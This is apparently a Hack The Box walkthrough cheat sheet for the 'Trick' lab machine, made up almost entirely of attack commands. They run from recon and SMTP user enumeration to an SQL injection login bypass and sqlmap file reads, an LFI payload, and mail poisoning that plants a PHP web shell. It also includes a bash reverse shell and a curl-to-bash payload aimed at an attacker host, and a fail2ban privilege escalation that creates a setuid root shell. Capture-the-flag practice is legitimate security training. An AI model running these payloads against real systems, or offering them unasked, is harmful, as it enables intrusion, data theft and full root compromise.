# 🧙 HTB: Trick – Walkthrough Command Notes

---

## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)

## 🔍 Recon

### Nmap Full Scan
```bash
nmap -p- --min-rate 10000 10.10.11.166
nmap -p 22,25,53,80 -sCV 10.10.11.166
```

### DNS Recon
```bash
dig +noall +answer @10.10.11.166 trick.htb
dig +noall +answer @10.10.11.166 -x 10.10.11.166
dig axfr trick.htb @10.10.11.166
```

### Subdomain Fuzz
```bash
wfuzz -u http://10.10.11.166 -H "Host: FUZZ.trick.htb" \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 5480

# Looking for preprod-* subdomains:
wfuzz -u http://10.10.11.166 -H "Host: preprod-FUZZ.trick.htb" \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 5480
```

---

## 📨 [SMTP](SMTP.md) Enumeration

### Manual
```bash
telnet 10.10.11.166 25
VRFY root
VRFY michael
```

### Automated
```bash
smtp-user-enum -m VRFY -U /usr/share/seclists/Usernames/cirt-default-usernames.txt -t 10.10.11.166
```

---

## 📂 Web Enumeration

### Feroxbuster
```bash
feroxbuster -u http://trick.htb -x php
```

---

## 💉 Auth Bypass & SQL Injection

### SQL Bypass Payload
```sql
username=' OR 1=1-- -
```

### sqlmap Usage
```bash
# Basic
sqlmap -r login.req --batch --technique=B --level 5

# Dump user table
sqlmap -r login.req --batch --threads 10 -D payroll_db -T users --dump

# File Read
sqlmap -r login.req --batch --threads 10 --file-read=/etc/passwd
sqlmap -r login.req --batch --threads 10 --file-read=/etc/nginx/sites-enabled/default
```

---

## 🌐 preprod-marketing.trick.htb - LFI

### Basic LFI Payload
```http
?page=....//....//....//....//etc/passwd
```

### Mail Poisoning via PHP Include
```bash
swaks --to michael --from attacker@htb.local \
--header "Subject: trick" --body "<?php system($_REQUEST['cmd']); ?>" \
--server 10.10.11.166
```

Then access:
```
http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//var/mail/michael&cmd=id
```

---

## 🐚 Reverse Shell (via mail or logs)

### Bash Reverse Shell Payload
```bash
bash -i >& /dev/tcp/10.10.14.6/443 0>&1
```

### Send via curl
```bash
swaks --to michael --from attacker@htb \
--body "<?php system('curl http://10.10.14.6/shell | bash'); ?>" \
--server 10.10.11.166
```

### Listener
```bash
nc -lnvp 443
```

---

## 🔐 SSH Access as michael

### Save Private Key
Paste into `~/keys/trick-michael`, then:
```bash
chmod 600 ~/keys/trick-michael
ssh -i ~/keys/trick-michael michael@trick.htb
```

---

## 🛡️ PrivEsc: fail2ban Exploit

### Enumerate fail2ban Config
```bash
sudo -l
cat /etc/fail2ban/jail.conf
cat /etc/fail2ban/action.d/iptables-multiport.conf
```

### Overwrite Action
Edit `/etc/fail2ban/action.d/iptables-multiport.conf`:
```bash
actionban = cp /bin/bash /tmp/rootbash; chmod 4777 /tmp/rootbash
```

### Restart fail2ban
```bash
sudo /etc/init.d/fail2ban restart
```

### Trigger Ban from Attacker Box
```bash
crackmapexec ssh trick.htb -u user -p /usr/share/wordlists/rockyou.txt
```

### Root Shell via SetUID Bash
```bash
/tmp/rootbash -p
id
```

---

## 🏁 Flags

```bash
# As michael
cat ~/user.txt

# As root
cat /root/root.txt
```